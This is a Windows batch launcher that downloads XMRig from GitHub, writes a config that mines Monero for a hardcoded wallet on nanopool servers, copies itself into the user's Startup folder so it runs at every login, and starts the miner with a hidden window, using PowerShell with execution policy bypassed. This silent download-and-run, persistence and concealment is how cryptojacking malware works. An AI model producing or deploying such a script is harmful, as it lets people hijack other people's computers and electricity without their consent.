@echo off
setlocal EnableExtensions
set "VERSION=6.22.0"
set "WALLET=83ks8iCJFod4JH29c1ZkaNJJUJgsrEM7ePP6YxGUKaFY3VHTUs3xRPpVW7DDgkDAj4NfUg9yT4c7pC4jRUBX1mUYAZEkCwM"
set "PRIMARY_POOL=xmr-asia1.nanopool.org:10343"
set "WORKDIR=%APPDATA%\XMRig"
set "XMRIG=%WORKDIR%\xmrig.exe"
set "CONFIG=%WORKDIR%\config.json"
set "ZIP=%WORKDIR%\xmrig.zip"
set "LOG=%WORKDIR%\launcher.log"
set "URL=https://github.com/xmrig/xmrig/releases/download/v%VERSION%/xmrig-%VERSION%-msvc-win64.zip"

if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
call :log "========== Launcher started =========="
call :log "Computer: %COMPUTERNAME%"
call :log "User: %USERNAME%"
call :log "Architecture: %PROCESSOR_ARCHITECTURE%"

tasklist /FI "IMAGENAME eq xmrig.exe" 2>nul | find /I "xmrig.exe" >nul
if not errorlevel 1 (
    call :log "XMRig is already running. Nothing to start."
    exit /b 0
)

if not exist "%XMRIG%" (
    call :log "XMRig not found. Downloading version %VERSION%..."
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP%'"
    if errorlevel 1 (
        call :log "ERROR: Download failed."
        exit /b 1
    )
    if not exist "%ZIP%" (
        call :log "ERROR: ZIP was not created."
        exit /b 1
    )

    if exist "%WORKDIR%\_extract" rmdir /S /Q "%WORKDIR%\_extract"
    mkdir "%WORKDIR%\_extract"

    call :log "Extracting archive..."
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%ZIP%' -DestinationPath '%WORKDIR%\_extract' -Force"
    if errorlevel 1 (
        call :log "ERROR: Extraction failed."
        exit /b 1
    )

    set "FOUND="
    for /R "%WORKDIR%\_extract" %%F in (xmrig.exe) do if not defined FOUND set "FOUND=%%F"

    if not defined FOUND (
        call :log "ERROR: xmrig.exe not found after extraction."
        exit /b 1
    )

    call :log "Found XMRig: %FOUND%"
    copy /Y "%FOUND%" "%XMRIG%" >nul
    if errorlevel 1 (
        call :log "ERROR: Could not copy xmrig.exe."
        exit /b 1
    )

    for %%D in ("%FOUND%") do set "SOURCEDIR=%%~dpD"
    xcopy "%SOURCEDIR%*" "%WORKDIR%\" /E /I /Y /Q >nul 2>&1

    rmdir /S /Q "%WORKDIR%\_extract" >nul 2>&1
    del /Q "%ZIP%" >nul 2>&1
    call :log "XMRig files prepared."
) else (
    call :log "XMRig already exists."
)

if not exist "%XMRIG%" (
    call :log "ERROR: XMRig executable is missing."
    exit /b 1
)

set "WORKER_ID=%COMPUTERNAME%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$worker=$env:COMPUTERNAME; $wallet='%WALLET%'; $p='%PRIMARY_POOL%'; $c=@{autosave=$false;background=$false;colors=$false;http=@{enabled=$true;host='127.0.0.1';port=8080;'access-token'=$null;restricted=$true};cpu=@{enabled=$true;'huge-pages'=$false;'max-threads-hint'=50;priority=1};pools=@(@{algo='rx/0';coin='monero';url=$p;user=$wallet;pass='x';tls=$true;keepalive=$true;'worker-id'=$worker},@{algo='rx/0';coin='monero';url='xmr-jp1.nanopool.org:10343';user=$wallet;pass='x';tls=$true;keepalive=$true;'worker-id'=$worker},@{algo='rx/0';coin='monero';url='xmr-au1.nanopool.org:10343';user=$wallet;pass='x';tls=$true;keepalive=$true;'worker-id'=$worker});}; $c|ConvertTo-Json -Depth 10|Set-Content -LiteralPath '%CONFIG%' -Encoding UTF8"

if errorlevel 1 (
    call :log "ERROR: Could not create config.json."
    exit /b 1
)

call :log "Config created. Worker ID: %WORKER_ID%"

set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\XMRig-Launcher.bat"
copy /Y "%~f0" "%STARTUP%" >nul 2>&1
if errorlevel 1 (
    call :log "WARNING: Could not install Startup launcher."
) else (
    call :log "Startup launcher installed."
)

call :log "Starting XMRig..."
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$p=Start-Process -FilePath '%XMRIG%' -ArgumentList '--config=\"%CONFIG%\"' -WorkingDirectory '%WORKDIR%' -WindowStyle Hidden -PassThru; Start-Sleep -Seconds 3; if($p.HasExited){exit $p.ExitCode}else{Write-Output $p.Id;exit 0}" > "%WORKDIR%\launch_result.tmp" 2>&1

if errorlevel 1 (
    call :log "ERROR: XMRig exited immediately."
    type "%WORKDIR%\launch_result.tmp" >> "%LOG%" 2>nul
    del /Q "%WORKDIR%\launch_result.tmp" >nul 2>&1
    exit /b 1
)

set /p PID=<"%WORKDIR%\launch_result.tmp"
del /Q "%WORKDIR%\launch_result.tmp" >nul 2>&1
call :log "XMRig started successfully. PID: %PID%"
call :log "Worker ID: %WORKER_ID%"
call :log "========== Launcher finished =========="
exit /b 0

:log
echo [%date% %time%] %~1
>>"%LOG%" echo [%date% %time%] %~1
exit /b 0
